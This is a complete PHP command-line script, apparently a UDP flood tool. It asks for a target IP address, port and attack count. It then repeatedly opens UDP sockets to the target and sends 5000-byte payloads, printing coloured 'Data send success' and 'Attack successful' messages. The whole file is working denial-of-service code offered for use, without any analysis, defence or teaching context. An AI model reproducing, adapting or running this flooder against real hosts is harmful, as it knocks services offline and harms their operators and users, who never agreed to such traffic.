<?php

namespace UDPFlood {
	
	$running = true;
	$msg = str_repeat("\x00", 5000);
	$attackcount = 0;
	echo "\x1b[38;5;145mAttack IP: ";
	$ip = trim(fgets(STDIN));
	
	echo "\x1b[38;5;145mAttack Port: ";
	$port = trim(fgets(STDIN));
	
	while(!is_numeric($port)){
		echo "\x1b[38;5;124mError: It's not a valid number.\n";
		echo "\x1b[38;5;145mAttack Port: ";
		$port = trim(fgets(STDIN));
	}
	echo "\x1b[38;5;145mAttack count: ";
	$count = trim(fgets(STDIN));
	
	while(!is_numeric($count)){
		echo "\x1b[38;5;124mError: It's not a valid number.\n";
		echo "\x1b[38;5;145mAttack Port: ";
		$count = trim(fgets(STDIN));
	}
	
	echo "\x1b[38;5;37mUDPFlood Started!\n";
	
	while(true){
		//usleep(100000);
		
		if($attackcount >= $count){
			echo "\x1b[38;5;37mAttack successful!\n\x1b[m";
			$running = false;
		}
		
		if(!$running){
			exit(1);
		}
		
		$fp = @fsockopen('udp://'.$ip, $port, $errno, $errstr, 30);
		if(!$fp) {
			echo "\x1b[38;5;124mUDP socket error: ".$errstr."\n";
			continue;
		}
		if(!@fwrite($fp, $msg)){
			echo "\x1b[38;5;19mData send error\n";
		}else {
			echo "\x1b[38;5;83mData send success!\n";
		}
		@fclose($fp);
		$attackcount++;
		echo "\x1b]0;UDPFlood - IP:".$ip." Port:".$port." AttackCount:".$attackcount."\x07";
	}

}
